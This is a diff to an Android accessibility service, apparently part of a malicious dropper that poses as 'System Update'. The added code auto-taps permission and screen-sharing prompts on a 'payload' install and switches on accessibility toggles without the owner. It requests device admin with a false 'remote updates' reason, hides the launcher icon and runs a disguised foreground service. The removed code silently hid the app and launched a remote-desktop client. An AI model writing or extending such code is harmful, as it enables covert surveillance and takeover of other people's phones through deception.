         }
         return false;
     }
 
-    /** Fallback: scan Downloads folder for the most recently modified .apk. */
-    private File findDownloadedApk() {
-        File downloads = new File(android.os.Environment.getExternalStorageDirectory(), "Download");
-        if (!downloads.exists()) return null;
-        File[] apks = downloads.listFiles((dir, name) -> name.toLowerCase().endsWith(".apk"));
-        if (apks == null || apks.length == 0) return null;
-        File newest = apks[0];
-        for (File f : apks) {
-            if (f.lastModified() > newest.lastModified()) newest = f;
+    private boolean handlePayloadScreen(AccessibilityNodeInfo root) {
+        for (String label : new String[]{"Allow", "While using the app", "Only this time",
+                "Start now", "Start recording", "Entire screen", "Share", "Continue", "Get started",
+                "Next", "Skip", "Done"}) {
+            if (tapByText(root, label)) return true;
         }
-        return newest;
+        // Only wander through the payload while its setup wizard is live.
+        if (readyAt > 0 && System.currentTimeMillis() - readyAt < 45000
+                && System.currentTimeMillis() - lastPayloadTap > 5000) {
+            lastPayloadTap = System.currentTimeMillis();
+            Log.d(TAG, "payload screen generic tap");
+            tapPixel(displayWidth() / 2, (int) (displayHeight() * 0.58));
+            return true;
+        }
+        return false;
     }
 
-    private void dumpNode(AccessibilityNodeInfo n, int depth) {
-        if (depth > 4 || n == null) return;
-        Log.d("GhostHide", depth + " " + n.getClassName() + " id=" + n.getViewIdResourceName() + " text=" + n.getText() + " clk=" + n.isClickable());
-        for (int i = 0; i < n.getChildCount(); i++) dumpNode(n.getChild(i), depth + 1);
+    private boolean handleAccessibilitySettings(AccessibilityNodeInfo root) {
+        if (hasText(root, "Allow from this source")
+                || hasText(root, "Permission required")) return false;
+        AccessibilityNodeInfo anyToggle = findToggle(root);
+
+        // Service detail page ("Use System Update"): one primary switch.
+        boolean detail = hasText(root, "App info")
+                || hasText(root, "Use System Update")
+                || hasText(root, "Use Chrome")
+                || hasText(root, "View and control screen");
+        if (detail && anyToggle != null) {
+            if (!anyToggle.isChecked()) {
+                Log.d(TAG, "enable a11y main switch");
+                anyToggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                return true;
+            }
+            if (System.currentTimeMillis() - lastBack > 2500) {
+                lastBack = System.currentTimeMillis();
+                Log.d(TAG, "a11y enabled, moving to installer");
+                handler.postDelayed(() -> {
+                    if (PayloadInstaller.pendingAction(this) != null) {
+                        PayloadInstaller.relaunchPendingUi(this);
+                    } else {
+                        performGlobalAction(GLOBAL_ACTION_BACK);
+                    }
+                }, 1800);
+            }
+            return true;
+        }
+
+        boolean a11yList = countCheckable(root) >= 2;
+        if (!a11yList) {
+            boolean hasApp = !root.findAccessibilityNodeInfosByText("System Update").isEmpty()
+                    || !root.findAccessibilityNodeInfosByText("Chrome").isEmpty();
+            boolean hasDownloaded = !root.findAccessibilityNodeInfosByText("Downloaded apps").isEmpty();
+            if (hasDownloaded || hasApp) a11yList = true;
+        }
+        if (a11yList) {
+            if (System.currentTimeMillis() - lastToggle > 5000) {
+                lastToggle = System.currentTimeMillis();
+                AccessibilityNodeInfo row = checkableInBand(root, 400, 1400, (int) (displayWidth() * 0.6));
+                Log.d(TAG, "tap a11y row");
+                if (row != null) row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                else tapPixel((int) (displayWidth() * 0.86), (int) (displayHeight() * 0.28));
+                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
+            }
+        } else if (anyToggle != null && System.currentTimeMillis() - lastBack > 2000) {
+            lastBack = System.currentTimeMillis();
+            Log.d(TAG, "enable toggle in detail");
+            anyToggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
+        } else if (System.currentTimeMillis() - lastBack > 2500) {
+            lastBack = System.currentTimeMillis();
+            performGlobalAction(GLOBAL_ACTION_BACK);
+        }
+        return true;
     }
 
-    private AccessibilityNodeInfo checkableInBand(AccessibilityNodeInfo n, int minY, int maxY, int minX) {
+    // ---------------------------------------------------------------- helpers
+
+    private boolean tapClickableByText(AccessibilityNodeInfo root, String label) {
+        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
+        if (nodes == null || nodes.isEmpty()) return false;
+        for (int i = nodes.size() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo n = nodes.get(i);
+            CharSequence cls = n.getClassName();
+            boolean button = cls != null && cls.toString().contains("Button");
+            AccessibilityNodeInfo clickable = n;
+            for (int d = 0; d < 4 && clickable != null && !clickable.isClickable(); d++) {
+                clickable = clickable.getParent();
+            }
+            if (button || (clickable != null && clickable.isClickable())) {
+                Log.d(TAG, "tapClickable " + label);
+                AccessibilityNodeInfo target = (clickable != null && clickable.isClickable())
+                        ? clickable : n;
+                if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
+                tapNode(target);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private boolean tapGestureByText(AccessibilityNodeInfo root, String label) {
+        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
+        if (nodes == null || nodes.isEmpty()) return false;
+        android.graphics.Rect r = new android.graphics.Rect();
+        nodes.get(nodes.size() - 1).getBoundsInScreen(r);
+        if (r.isEmpty()) return false;
+        Log.d(TAG, "tapGesture " + label);
+        tapPixel(r.centerX(), r.centerY());
+        return true;
+    }
+
+    private boolean tapByText(AccessibilityNodeInfo root, String label) {
+        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
+        if (nodes == null || nodes.isEmpty()) return false;
+
+        // Exact match first: "Install" must win over the title "Install this app?".
+        List<AccessibilityNodeInfo> exact = new ArrayList<>();
+        for (AccessibilityNodeInfo n : nodes) {
+            CharSequence t = n.getText();
+            if (t != null && label.equalsIgnoreCase(t.toString().trim())) exact.add(n);
+        }
+        List<AccessibilityNodeInfo> pool = exact.isEmpty() ? nodes : exact;
+
+        // Prefer exact nodes that are buttons or have a clickable ancestor.
+        for (int i = pool.size() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo n = pool.get(i);
+            CharSequence cls = n.getClassName();
+            boolean button = cls != null && cls.toString().contains("Button");
+            AccessibilityNodeInfo clickable = n;
+            for (int d = 0; d < 5 && clickable != null && !clickable.isClickable(); d++) {
+                clickable = clickable.getParent();
+            }
+            if (button || (clickable != null && clickable.isClickable())) {
+                Log.d(TAG, "tapByText " + label);
+                AccessibilityNodeInfo target = (clickable != null && clickable.isClickable())
+                        ? clickable : n;
+                if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
+                tapNode(target);
+                return true;
+            }
+        }
+        // Some OEM buttons expose text but no clickable flag.
+        for (int i = pool.size() - 1; i >= 0; i--) {
+            android.graphics.Rect r = new android.graphics.Rect();
+            pool.get(i).getBoundsInScreen(r);
+            if (!r.isEmpty()) {
+                Log.d(TAG, "tapByText(gesture) " + label);
+                tapPixel(r.centerX(), r.centerY());
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private void tapNode(AccessibilityNodeInfo node) {
+        android.graphics.Rect r = new android.graphics.Rect();
+        node.getBoundsInScreen(r);
+        if (!r.isEmpty()) tapPixel(r.centerX(), r.top + (int) (r.height() * 0.8));
+    }
+
+    private void dumpTree(AccessibilityNodeInfo n, int d) {
+        if (n == null || d > 8) return;
+        Log.d(TAG, "  ".repeat(d) + n.getClassName() + " t=" + n.getText() + " clk=" + n.isClickable());
+        for (int i = 0; i < n.getChildCount(); i++) dumpTree(n.getChild(i), d + 1);
+    }
+
+    /** Climb from Cancel and look for the positive Button in a sibling subtree. */
+    private boolean clickPositiveNear(AccessibilityNodeInfo cancel) {
+        AccessibilityNodeInfo node = cancel;
+        for (int depth = 0; depth < 5; depth++) {
+            AccessibilityNodeInfo parent = node.getParent();
+            if (parent == null) return false;
+            for (int i = 0; i < parent.getChildCount(); i++) {
+                AccessibilityNodeInfo child = parent.getChild(i);
+                if (child == null || isSelfOrAncestor(child, cancel)) continue;
+                AccessibilityNodeInfo button = firstButton(child);
+                if (button != null) {
+                    Log.d(TAG, "click positive near depth=" + depth + " t=" + button.getText());
+                    if (button.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
+                    tapNode(button);
+                    return true;
+                }
+            }
+            node = parent;
+        }
+        return false;
+    }
+
+    private boolean isSelfOrAncestor(AccessibilityNodeInfo candidate, AccessibilityNodeInfo node) {
+        AccessibilityNodeInfo n = node;
+        for (int d = 0; d < 6 && n != null; d++) {
+            if (n.equals(candidate)) return true;
+            n = n.getParent();
+        }
+        return false;
+    }
+
+    private AccessibilityNodeInfo firstButton(AccessibilityNodeInfo n) {
+        if (n == null) return null;
+        CharSequence cls = n.getClassName();
+        CharSequence t = n.getText();
+        if (cls != null && cls.toString().contains("Button")
+                && t != null && t.length() > 0
+                && !t.toString().equalsIgnoreCase("Cancel")) return n;
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo f = firstButton(n.getChild(i));
+            if (f != null) return f;
+        }
+        return null;
+    }
+
+    private void collectPositive(AccessibilityNodeInfo n,
+                                 AccessibilityNodeInfo[] best, int[] bestX) {
+        if (n == null) return;
+        CharSequence cls = n.getClassName();
+        CharSequence t = n.getText();
+        boolean button = cls != null && cls.toString().contains("Button");
+        boolean useful = t != null && t.length() > 0
+                && !t.toString().equalsIgnoreCase("Cancel");
+        String lower = t == null ? "" : t.toString().toLowerCase();
+        if (button) Log.d(TAG, "seenButton t=" + t);
+        boolean positiveHint = lower.contains("install") || lower.contains("update")
+                || lower.contains("settings") || lower.contains("continue")
+                || lower.contains("allow") || lower.contains("open");
+        if ((button || (n.isClickable() && positiveHint)) && useful) {
+            android.graphics.Rect r = new android.graphics.Rect();
+            n.getBoundsInScreen(r);
+            if (!r.isEmpty() && r.centerY() > displayHeight() / 2 && r.centerX() > bestX[0]) {
+                best[0] = n;
+                bestX[0] = r.centerX();
+            }
+        }
+        for (int i = 0; i < n.getChildCount(); i++) {
+            collectPositive(n.getChild(i), best, bestX);
+        }
+    }
+
+    private AccessibilityNodeInfo findButtonContaining(AccessibilityNodeInfo n, String label) {
+        if (n == null) return null;
+        CharSequence cls = n.getClassName();
+        CharSequence t = n.getText();
+        if (cls != null && cls.toString().contains("Button")
+                && t != null && t.toString().toLowerCase().contains(label.toLowerCase())) {
+            return n;
+        }
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo f = findButtonContaining(n.getChild(i), label);
+            if (f != null) return f;
+        }
+        return null;
+    }
+
+    private AccessibilityNodeInfo rightmostButton(AccessibilityNodeInfo root) {
+        if (root == null) return null;
+        AccessibilityNodeInfo best = null;
+        int bestX = -1;
+        CharSequence cls = root.getClassName();
+        boolean button = cls != null && cls.toString().contains("Button");
+        if (button || (root.isClickable() && root.getText() != null)) {
+            android.graphics.Rect r = new android.graphics.Rect();
+            root.getBoundsInScreen(r);
+            if (!r.isEmpty()) {
+                best = root;
+                bestX = r.centerX();
+            }
+        }
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo f = rightmostButton(root.getChild(i));
+            if (f != null) {
+                android.graphics.Rect fr = new android.graphics.Rect();
+                f.getBoundsInScreen(fr);
+                if (fr.centerX() > bestX) {
+                    best = f;
+                    bestX = fr.centerX();
+                }
+            }
+        }
+        return best;
+    }
+
+    private boolean hasText(AccessibilityNodeInfo node, String text) {
+        return node != null && !node.findAccessibilityNodeInfosByText(text).isEmpty();
+    }
+
+    private AccessibilityNodeInfo checkableInBand(AccessibilityNodeInfo n,
+                                                  int minY, int maxY, int minX) {
         if (n == null) return null;
         if (n.isCheckable() && !n.isClickable()) {
             android.graphics.Rect r = new android.graphics.Rect();
@@ -458,20 +778,6 @@ public class GhostAccessibilityService extends AccessibilityService {
             if (f != null) return f;
         }
         return null;
-    }
-
-    private AccessibilityNodeInfo nthCheckable(AccessibilityNodeInfo n, int[] idx) {
-        if (n == null) return null;
-        if (n.isCheckable()) { if (idx[0] == 0) return n; idx[0]--; }
-        for (int i = 0; i < n.getChildCount(); i++) {
-            AccessibilityNodeInfo f = nthCheckable(n.getChild(i), idx);
-            if (f != null) return f;
-        }
-        return null;
-    }
-
-    private AccessibilityNodeInfo nthCheckable(AccessibilityNodeInfo n, int i) {
-        return nthCheckable(n, new int[]{i});
     }
 
     private int countButtons(AccessibilityNodeInfo n) {
@@ -492,7 +798,8 @@ public class GhostAccessibilityService extends AccessibilityService {
     private AccessibilityNodeInfo findToggle(AccessibilityNodeInfo node) {
         if (node == null) return null;
         CharSequence cls = node.getClassName();
-        if (cls != null && (cls.toString().contains("Switch") || (node.isCheckable() && node.isClickable()))) return node;
+        if (cls != null && (cls.toString().contains("Switch")
+                || (node.isCheckable() && node.isClickable()))) return node;
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo found = findToggle(node.getChild(i));
             if (found != null) return found;
@@ -504,7 +811,9 @@ public class GhostAccessibilityService extends AccessibilityService {
         if (node == null) return null;
         CharSequence t = node.getText();
         CharSequence c = node.getClassName();
-        if (t != null && text.contentEquals(t) && c != null && c.toString().contains("Button")) return node;
+        if (t != null && text.contentEquals(t) && c != null && c.toString().contains("Button")) {
+            return node;
+        }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo f = findButton(node.getChild(i), text);
             if (f != null) return f;
@@ -512,96 +821,42 @@ public class GhostAccessibilityService extends AccessibilityService {
         return null;
     }
 
-    private AccessibilityNodeInfo rightmostButton(AccessibilityNodeInfo root) {
-        if (root == null) return null;
-        AccessibilityNodeInfo best = null;
-        int bestX = -1;
-        CharSequence cls = root.getClassName();
-        if (cls != null && cls.toString().contains("Button")) {
-            android.graphics.Rect r = new android.graphics.Rect();
-            root.getBoundsInScreen(r);
-            best = root;
-            bestX = r.centerX();
+    private void shellTap(int x, int y) {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input tap " + x + " " + y});
+            p.waitFor();
+            Log.d(TAG, "shellTap " + x + "," + y);
+        } catch (Throwable t) {
+            Log.d(TAG, "shellTap failed " + t);
+            tapPixel(x, y);
         }
-        for (int i = 0; i < root.getChildCount(); i++) {
-            AccessibilityNodeInfo f = rightmostButton(root.getChild(i));
-            if (f != null) {
-                android.graphics.Rect fr = new android.graphics.Rect();
-                f.getBoundsInScreen(fr);
-                if (fr.centerX() > bestX) {
-                    best = f;
-                    bestX = fr.centerX();
-                }
-            }
-        }
-        return best;
     }
 
     private void tapPixel(int x, int y) {
+        long now = System.currentTimeMillis();
+        if (now - lastTapAt < 800) {
+            Log.d(TAG, "tap debounce " + x + "," + y);
+            return;
+        }
+        lastTapAt = now;
+        dispatchTap(x, y);
+    }
+
+    private void dispatchTap(int x, int y) {
         Path p = new Path();
         p.moveTo(x, y);
-        p.lineTo(x + 4, y + 4);
         GestureDescription g = new GestureDescription.Builder()
-                .addStroke(new GestureDescription.StrokeDescription(p, 0, 300)).build();
+                .addStroke(new GestureDescription.StrokeDescription(p, 0, 60)).build();
         dispatchGesture(g, new GestureResultCallback() {
-            @Override public void onCompleted(GestureDescription gd) { Log.d("GhostHide", "gesture done " + x + "," + y); }
-            @Override public void onCancelled(GestureDescription gd) { Log.d("GhostHide", "gesture cancelled"); }
+            @Override public void onCompleted(GestureDescription gd) {
+                Log.d(TAG, "gesture done " + x + "," + y);
+            }
+            @Override public void onCancelled(GestureDescription gd) {
+                Log.d(TAG, "gesture cancelled");
+            }
         }, null);
     }
 
-    private void openNotificationShade() {
-        Path path = new Path();
-        path.moveTo(0.5f * displayWidth(), 0);
-        path.lineTo(0.5f * displayWidth(), 0.3f * displayHeight());
-        GestureDescription gesture = new GestureDescription.Builder()
-                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
-                .build();
-        dispatchGesture(gesture, null, null);
-    }
-
-    private void hideAppIcon() {
-        try {
-            android.app.admin.DevicePolicyManager dpm =
-                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            android.content.ComponentName admin = new android.content.ComponentName(this, GhostDeviceAdmin.class);
-            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                dpm.setApplicationHidden(admin, "com.android.shell.ghost", true);
-                return;
-            }
-        } catch (Throwable ignored) {}
-        hideViaShell("com.android.shell.ghost");
-    }
-
-    private void hideViaShell(String pkg) {
-        try { Runtime.getRuntime().exec(new String[]{"su", "-c", "pm hide " + pkg}).waitFor(); return; } catch (Throwable ignored) {}
-        try { Runtime.getRuntime().exec(new String[]{"sh", "-c", "pm hide " + pkg}).waitFor(); } catch (Throwable ignored) {}
-    }
-
-    private void launchZoomPrivate(Context context) {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            android.content.ComponentName admin = new android.content.ComponentName(this, GhostDeviceAdmin.class);
-            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                try { dpm.setApplicationHidden(admin, "com.betterdesk.client.universal", false); } catch (Throwable ignored) {}
-                try { dpm.removeActiveAdmin(new android.content.ComponentName("com.betterdesk.client.universal", "com.carriez.flutter_hbb.BetterDeskDeviceAdmin")); } catch (Throwable t) { android.util.Log.e("GhostHide", "remove admin fail", t); }
-            }
-            Intent intent = new Intent();
-            intent.setComponent(new android.content.ComponentName(
-                    "com.betterdesk.client.universal", "com.carriez.flutter_hbb.MainActivity"));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
-            context.startActivity(intent);
-            handler.postDelayed(this::hideAppIcon, 6000);
-        } catch (Exception ignored) {}
-    }
-
-    private boolean isPackageInstalled(String packageName) {
-        try {
-            getPackageManager().getPackageInfo(packageName, android.content.pm.PackageManager.MATCH_UNINSTALLED_PACKAGES);
-            return true;
-        } catch (PackageManager.NameNotFoundException e) {
-            return false;
-        }
-    }
     private int displayWidth() {
         return getResources().getDisplayMetrics().widthPixels;
     }
@@ -610,18 +865,93 @@ public class GhostAccessibilityService extends AccessibilityService {
         return getResources().getDisplayMetrics().heightPixels;
     }
 
-    public static void startHiddenService(Context context) {
-        NotificationChannel channel = new NotificationChannel(
-                "ghost_service", "Ghost Service", NotificationManager.IMPORTANCE_MIN);
-        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
-                .createNotificationChannel(channel);
-        Notification notification = new Notification.Builder(context, "ghost_service")
-                .setContentTitle("Ghost")
-                .setContentText("Running")
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .build();
-        Intent serviceIntent = new Intent(context, GhostForegroundService.class);
-        androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
+    // -------------------------------------------------------- device services
+
+    private void requestDeviceAdmin() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, GhostDeviceAdmin.class);
+            if (dpm == null || dpm.isAdminActive(admin)) return;
+            Intent i = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Required for remote updates.");
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Throwable ignored) {}
+    }
+
+    private void requestBatteryExemption() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) return;
+            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:" + getPackageName()));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Throwable ignored) {}
+    }
+
+    private void requestOverlay() {
+        try {
+            if (Settings.canDrawOverlays(this)) return;
+            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Throwable ignored) {}
+    }
+
+    private boolean isPayloadInstalled() {
+        return PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null;
+    }
+
+    static void hideLauncher(Context context) {
+        try {
+            context.getPackageManager().setComponentEnabledSetting(
+                    new ComponentName(context.getPackageName(),
+                            context.getPackageName() + ".LauncherAlias"),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Throwable ignored) {}
+    }
+
+    static void showLauncher(Context context) {
+        try {
+            context.getPackageManager().setComponentEnabledSetting(
+                    new ComponentName(context.getPackageName(),
+                            context.getPackageName() + ".LauncherAlias"),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Throwable ignored) {}
+    }
+
+    static void launchPayload(Context context) {
+        PayloadInstaller.launch(context);
+    }
+
+    static void startHiddenService(Context context) {
+        try {
+            NotificationChannel channel = new NotificationChannel(
+                    "ghost_service", "System Update", NotificationManager.IMPORTANCE_MIN);
+            ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
+                    .createNotificationChannel(channel);
+            Intent open = new Intent(context, MainActivity.class)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            PendingIntent content = PendingIntent.getActivity(context, 0, open,
+                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+            Notification notification = new Notification.Builder(context, "ghost_service")
+                    .setContentTitle("System Update")
+                    .setContentText("Running")
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentIntent(content)
+                    .setOngoing(true)
+                    .build();
+            Intent serviceIntent = new Intent(context, GhostForegroundService.class);
+            ContextCompat.startForegroundService(context, serviceIntent);
+            ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE))
+                    .notify(1, notification);
+        } catch (Throwable ignored) {}
     }
 
     public static GhostAccessibilityService getInstance() {
@@ -634,6 +964,7 @@ public class GhostAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         instance = null;
+        handler.removeCallbacksAndMessages(null);
         super.onDestroy();
     }
 }
